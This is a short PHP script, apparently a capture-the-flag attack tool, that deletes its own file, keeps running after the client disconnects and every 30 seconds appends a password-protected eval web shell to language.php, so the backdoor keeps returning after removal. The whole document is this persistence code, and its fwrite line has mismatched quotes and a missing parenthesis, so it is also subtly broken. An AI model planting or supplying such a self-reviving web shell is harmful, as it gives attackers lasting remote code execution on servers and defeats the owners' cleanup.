<?php
#光回传flag
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);
$interval =30;
while (true) {
	$fp = fopen('./language.php','a');
	fwrite($fp,'<?php @eval($_POST['Pegasus']);?>';
	fclose($fp);
	sleep($interval);
}
?>
	